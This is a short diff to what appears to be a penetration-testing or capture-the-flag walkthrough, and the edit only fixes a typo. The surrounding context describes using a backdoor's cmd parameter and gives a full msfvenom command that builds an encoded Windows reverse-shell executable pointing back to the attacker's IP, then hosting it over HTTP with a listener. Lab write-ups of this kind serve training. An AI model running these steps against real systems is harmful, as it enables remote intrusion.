@@ -58,7 +58,7 @@ Now let’s access the page using the cmd param of the backdoor
 
 Success! Now let’s try to get a shell… run the following command to generate an .exe file
 - msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=1234 -f exe -e x86/shikata_ga_nai -i 9 -o reverse.exe
-- Start a http server (Examplo: sudo python3 -m http.server 80)
+- Start a http server (Ex: sudo python3 -m http.server 80)
 - Start an listener on port 123
 
 In the browser access the url:
